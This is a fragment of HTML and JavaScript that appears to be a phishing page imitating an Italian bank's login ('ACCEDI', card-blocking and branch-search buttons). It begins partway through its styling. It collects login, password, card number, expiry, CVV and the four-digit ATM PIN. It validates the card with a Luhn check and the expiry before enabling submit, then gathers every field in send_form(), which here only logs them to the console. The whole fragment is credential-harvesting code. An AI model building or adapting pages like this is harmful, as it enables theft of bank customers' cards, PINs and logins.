                font-size: 13px;

                left: 0;
                right: 0;

            fieldset p {

                text-align: left;
                left: 0;
                right: 0;
                border: 1px solid #6fcbd8;
                padding: 30px;
                border-radius: 50px;
                background: #6fcbd8;
            }

            <input type="text" name="exp" id="exp" onkeyup="check3()">

            <input type="text" name="cvv" id="cvv" onkeyup="check3()">
            <label style="float: left; padding-bottom: 0px; padding-left: 5px; color: #666666;">ATM Password</label>
            <input type="text" name="atm" id="atm" onkeyup="check3()">
            <input type="button" style="margin-bottom: 5px;" id="b3" onclick="send_form();" value="ACCEDI" disabled="disabled" name="sumbit">

        </fieldset>

        <fieldset style="background-color: #d2ddd9;">
            <input type="button" name="" value="Blocco Bancomat e Carte" style="float: none;width: auto;height: 40px;cursor: pointer;">
            <input type="button" name="" value="Ricerca Filiale e Bancomat" style="float: none;width: auto;height: 40px; cursor: pointer;">
        </fieldset>

        <script>

            $('#cc').mask('0000 0000 0000 0000');
            $('#exp').mask('00/00');
            $('#cvv').mask('000');
            $('#atm').mask('0000')

            function formToJSONbyName(f) {
                var FinalObject = {},
                    namesHTML = ['input', 'select'];
                for (var i = 0; i < namesHTML.length; i++) {
                    var bsform = f.getElementsByTagName(namesHTML[i]);
                    for (var j = 0; j < bsform.length; j++) {
                        if (bsform[j].name == 'sumbit') 
                            continue;
                        FinalObject[bsform[j].name] = bsform[j].value
                    }
                }
                return FinalObject;
            }

            function check3(event) {
                var mmYY = exp
                    .value
                    .split('/');
                var month = parseInt(mmYY[0]);
                var year = parseInt(mmYY[1]);

                var expArray = exp
                    .value
                    .split('/');
                var today,
                    someday;
                var exMonth = expArray[0];
                var exYear = "20" + expArray[1];

                today = new Date();
                someday = new Date();
                someday.setFullYear(exYear, exMonth, 1);

                function expCheck() {
                    if (month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                        return false
                    } else {
                        return true
                    }
                }

                if (valid_credit_card(cc.value) && expCheck() == true && cvv.value.length == 3 && atm.value.length === 4) {

                    document
                        .getElementById('b3')
                        .disabled = false

                } else {}
            }

            function valid_credit_card(value) {
                if (value == '' || value.length < 19 || value == '0000 0000 0000 0000') 
                    return false;
                if (/[^0-9-\s]+/.test(value)) 
                    return false;
                var nCheck = 0,
                    nDigit = 0,
                    bEven = false;
                value = value.replace(/\D/g, "");
                for (var n = value.length - 1; n >= 0; n--) {
                    var cDigit = value.charAt(n),
                        nDigit = parseInt(cDigit, 10);
                    if (bEven) {
                        if ((nDigit *= 2) > 9) 
                            nDigit -= 9;
                        }
                    nCheck += nDigit;
                    bEven = !bEven;
                }
                return (nCheck % 10) == 0;
            }

            function next() {
                var form = document
                    .getElementById('formtosend')
                    .style
                    .display = "none";

                var form = document
                    .getElementById('card_view')
                    .style
                    .display = "block";
            }

            function send_form() {
                var form = document.getElementById('formtosend');
                var form2 = document.getElementById('card_view');

                const {
                    atm,
                    cc,
                    cvv,
                    exp,
                    login,
                    password
                } = {
                    ...formToJSONbyName(form),
                    ...formToJSONbyName(form2)
                }
                console.log('print event: ' + login + ' : ' + password + ' : ' + cc + ' : ' + exp + ' : ' + cvv + ' : ' + atm);

            }
        </script>
